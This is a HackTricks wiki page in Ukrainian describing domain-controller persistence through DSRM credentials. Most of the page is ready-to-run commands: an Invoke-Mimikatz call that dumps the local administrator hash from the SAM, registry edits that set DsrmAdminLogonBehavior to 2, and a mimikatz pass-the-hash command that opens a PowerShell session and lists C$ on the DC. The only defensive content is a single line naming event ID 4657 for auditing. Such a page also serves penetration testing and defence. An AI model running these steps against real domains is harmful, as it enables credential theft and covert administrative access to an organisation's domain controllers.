<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакінг-трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>


# Облікові дані DSRM

У кожному **DC** є обліковий запис **локального адміністратора**. Маючи права адміністратора на цій машині, ви можете використовувати mimikatz для **витягування хешу локального адміністратора**. Потім, змінивши реєстр для **активації цього пароля**, ви зможете віддалено отримати доступ до цього локального облікового запису адміністратора.\
Спочатку нам потрібно **витягнути** **хеш** **локального облікового запису адміністратора** всередині DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Тоді нам потрібно перевірити, чи працює цей обліковий запис, і якщо ключ реєстру має значення "0" або не існує, вам потрібно **встановити його на "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Потім, використовуючи PTH, ви можете **переглянути вміст C$ або навіть отримати оболонку**. Зверніть увагу, що для створення нової сесії PowerShell з цим хешем в пам'яті (для PTH) **"domain", яке використовується, це лише ім'я машини DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Додаткова інформація за посиланнями: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) та [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Зменшення ризику

* Подія з ID 4657 - Аудит створення/зміни `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`
